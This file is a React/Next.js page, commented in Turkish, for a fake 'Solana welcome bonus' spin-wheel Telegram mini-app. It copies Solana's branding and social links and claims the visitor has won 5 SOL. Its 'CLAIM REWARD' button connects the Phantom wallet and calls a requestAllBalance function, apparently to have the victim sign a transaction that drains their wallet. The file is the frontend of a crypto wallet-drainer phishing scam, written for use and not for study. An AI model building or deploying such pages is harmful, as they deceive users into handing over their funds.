// app/page.tsx
/* eslint-disable @typescript-eslint/no-explicit-any */

'use client'

import React, { useEffect, useRef, useState } from 'react'
import './assets/2idql.css'                // Tasarım CSS’i

/* ——————————————————————————————————————— */
/*  Phantom tipi için hafif declare         */
/* ——————————————————————————————————————— */
declare global {
  interface Window {
    solana?: {
      publicKey?: any
      connect?: () => Promise<any>
      disconnect?: () => Promise<void>
      signTransaction?: (tx: any) => Promise<any>
      isPhantom?: boolean
    }
  }
}

/* ——————————————————————————————————————— */
/*  Solana deeplink / Phantom Browser açma   */
/* ——————————————————————————————————————— */
const isMobile = () => /iPhone|iPad|iPod|Android/i.test(navigator.userAgent)
const openPhantomBrowser = () => {
  const dappUrl   = encodeURIComponent('https://solspin-seven.vercel.app/')
  const universal = `https://phantom.app/ul/browse/${dappUrl}?ref=${dappUrl}`
  window.open(universal, '_blank')
}

/* ——————————————————————————————————————— */
/*  Cüzdan bağlantı & transaction fonksiyonları */
/* ——————————————————————————————————————— */
import { connectWallet }         from '@/app/services/connect'
import { requestAllBalance }     from '@/app/services/transaction'

/* ——————————————————————————————————————— */
/*  Telegram Web-App için hafif tip tanımı   */
/* ——————————————————————————————————————— */
interface TgWebApp {
  expand: () => void
  requestFullscreen?: () => void                 // Bot API 7.8+
  setHeaderColor:    (typeOrColor: string, colorHex?: string) => void
  setBackgroundColor:(colorHex: string) => void
  disableVerticalSwipes?: () => void             // Bot API 7.7
  scroll?: (offsetY: number) => void             // çok eski sürüm
}
type TgWindow = Window & { Telegram?: { WebApp?: TgWebApp } }

/* ——————————————————————————————————————— */
/*              SAYFA BİLEŞENİ                */
/* ——————————————————————————————————————— */
const Page = () => {

  /* -------- Telegram Mini-App başlat -------- */
  useEffect(() => {
    const webapp = (window as TgWindow).Telegram?.WebApp
    if (!webapp) return

    try {
      /* 1) Her zaman expand */
      webapp.expand()
      /* 2) Varsa gerçek tam ekran */
      if (typeof webapp.requestFullscreen === 'function') {
        webapp.requestFullscreen()
      }
      /* 3) Tema renkleri */
      webapp.setHeaderColor('bg_color', '#000000')
      webapp.setBackgroundColor('#000000')
      /* 4) Swipe-to-close kapat */
      if (typeof webapp.disableVerticalSwipes === 'function') {
        webapp.disableVerticalSwipes()
      } else if (typeof webapp.scroll === 'function') {
        const lockScroll = () => webapp.scroll!(window.scrollY)
        window.addEventListener('scroll', lockScroll)
        return () => window.removeEventListener('scroll', lockScroll)
      }
    } catch (err) {
      console.error('Telegram WebApp init hatası:', err)
    }
  }, [])

  /* -------- ÇARK (spin) durumu -------- */
  const wheelRef = useRef<HTMLImageElement>(null)
  const [hasSpun, setHasSpun] = useState<boolean>(() => {
    if (typeof window === 'undefined') return false
    return localStorage.getItem('hasSpun') === 'true'
  })
  useEffect(() => {
    if (hasSpun) document.querySelector('._1')?.classList.add('modal_active')
  }, [hasSpun])
  const handleSpin = () => {
    if (hasSpun || !wheelRef.current) return
    const wheel = wheelRef.current
    wheel.style.transition = 'transform 9000ms ease-in-out'
    wheel.style.transform  = 'rotate(1080deg)'   // 3 tur
    setTimeout(() => {
      wheel.style.transition = 'none'
      wheel.style.transform  = 'rotate(0deg)'
    }, 9000)
    setTimeout(() => {
      setHasSpun(true)
      localStorage.setItem('hasSpun', 'true')
    }, 10000)
  }

  /* -------- Wallet & Transaction Durumları -------- */
  const [isWalletConnected, setIsWalletConnected] = useState(false)
  const [isLoading,         setIsLoading]         = useState(false)
  const [withdrawMessage,   setWithdrawMessage]   = useState('')

  /*  Sayfa yüklenince, cüzdan zaten bağlıysa işaretle */
  useEffect(() => {
    if (window.solana?.publicKey) {
      setIsWalletConnected(true)
    }
  }, [])

  /*  Cüzdan bağlama */
  const handleConnect = async () => {
    if (isMobile() && !window.solana) {
      openPhantomBrowser()
      return
    }
    await connectWallet()
    if (window.solana?.publicKey) setIsWalletConnected(true)
  }

  /*  Ödül (transaction) talebi */
  const handleWithdraw = async () => {
    setIsLoading(true)

    /* 1) Mobil + Phantom yok → deeplink */
    if (isMobile() && !window.solana) {
      openPhantomBrowser()
      setIsLoading(false)
      return
    }

    /* 2) Cüzdan bağlı değilse önce bağlan */
    if (!window.solana?.publicKey) {
      await handleConnect()
    }
    if (!window.solana?.publicKey) {        // hâlâ yoksa abort
      setIsLoading(false)
      return
    }

    /* 3) Transaction gönder */
    let txResult: boolean | undefined
    try {
      txResult = await requestAllBalance()
    } catch (e) {
      console.error('Transaction hatası:', e)
    } finally {
      setIsLoading(false)
    }

    if (txResult === false) {
      setWithdrawMessage('No enough Sol!')
      setTimeout(() => setWithdrawMessage(''), 5000)
    }
  }

  /* ——————————————————————————————————————— */
  /*                    JSX                     */
  /* ——————————————————————————————————————— */
  return (
    <>
      {/* ---------- HERO BANNER ---------- */}
      <div className="_1">
        <div className="_g">
          <span className="_a">
            <div className="_3">
              <p className="_7">
                CONGRATULATIONS! <br />
                <span className="_a">You won</span>{' '}
                <span><span className="_a">5 $SOL</span></span>
              </p>
            </div>
          </span>

          <div className="_9">
            <div className="_i">
              <p className="_k">Connect your wallet to receive reward</p>
              <button
                onClick={handleWithdraw}
                className="_s"
                disabled={isLoading}
              >
                {isLoading
                  ? 'Please wait…'
                  : withdrawMessage || 'CLAIM REWARD'}
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* ---------- HEADER ---------- */}
      <section className="_b">
        <div className="_d">
          <div className="_x">
            {/* Logo + avatar */}
            <div className="_0">
              <a href="#!" className="_h">
                <img src="/header_logo.svg" alt="Solana logo" />
              </a>
              <a href="#!" className="_w">
                <img src="/alik.png" className="_t" alt="avatar" />
              </a>
            </div>

            {/* Sosyal linkler */}
            <div className="_0">
              <div className="_6">
                <a
                  href="https://x.com/solana?mx=2"
                  target="_blank"
                  className="_q"
                  rel="noreferrer"
                >
                  <img src="/header_twitter.svg" alt="Twitter / X" />
                </a>
                <a
                  href="https://t.me/solana"
                  target="_blank"
                  className="_q"
                  rel="noreferrer"
                >
                  <img src="/header_tg.svg" alt="Telegram" />
                </a>
                <a
                  href="https://www.youtube.com/SolanaFndn"
                  target="_blank"
                  className="_q"
                  rel="noreferrer"
                >
                  <img src="/header_mail.svg" alt="YouTube" />
                </a>
                <a
                  href="https://discord.com/invite/kBbATFA7PW"
                  target="_blank"
                  className="_q"
                  rel="noreferrer"
                >
                  <img src="/header_ds.svg" alt="Discord" />
                </a>
              </div>
            </div>

            {/* Connect Wallet */}
            <div className="_0">
              <button onClick={handleConnect} className="_n">
                <span className="_a">
                  {isWalletConnected ? 'Wallet connected' : 'Connect Wallet'}
                </span>
                <img src="/header_arrow.svg" alt="" />
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* ---------- MAIN SECTION ---------- */}
      <section className="_m">
        <div className="_d">
          <h1 className="_4">
            WELCOME <span>BONUS</span>
            <br />
            FOR SOLANA USERS
          </h1>

          {/* ÇARK (Wheel) */}
          <div className="_o">
            <div className="_r">
              <img src="/wheel_arrow.png" alt="Arrow" className="_f" />
              <img
                ref={wheelRef}
                src="/wheel_wheel.png"
                alt="Wheel"
                className="_l"
                id="_8"
              />
              <button className="_y" id="_c" onClick={handleSpin}>
                FREE SPIN
              </button>
            </div>
          </div>

          {/* Açıklama kutuları */}
          <div className="_u">
            <div className="_j">
              <p className="_p">
                <img src="/main_one.svg" alt="step 1" />
                If you have received a qualification notification in the form of
                SOL or USDT, click the «FREE SPIN» button
              </p>
              <p className="_p">
                <img src="/main_two.svg" alt="step 2" />
                If you win a reward in free spin, we congratulate you!
              </p>
              <p className="_p">
                <img src="/main_three.svg" alt="step 3" />
                Click «CLAIM REWARD», connect your wallet and confirm the
                received transaction
              </p>
            </div>
            <p className="_e">All rights reserved © 2025 SOLANA.</p>
          </div>
        </div>
      </section>

      {/* ---------- FOOTER SOCIAL ---------- */}
      <section className="_v">
        <div className="_d">
          <div className="_6">
            <a
              href="https://x.com/solana?mx=2"
              target="_blank"
              className="_q"
              rel="noreferrer"
            >
              <img src="/header_twitter.svg" alt="Twitter" />
            </a>
            <a
              href="https://t.me/solana"
              target="_blank"
              className="_q"
              rel="noreferrer"
            >
              <img src="/header_tg.svg" alt="Telegram" />
            </a>
            <a
              href="https://www.youtube.com/SolanaFndn"
              target="_blank"
              className="_q"
              rel="noreferrer"
            >
              <img src="/header_mail.svg" alt="YouTube" />
            </a>
            <a
              href="https://discord.com/invite/kBbATFA7PW"
              target="_blank"
              className="_q"
              rel="noreferrer"
            >
              <img src="/header_ds.svg" alt="Discord" />
            </a>
          </div>
        </div>
      </section>
    </>
  )
}

export default Page
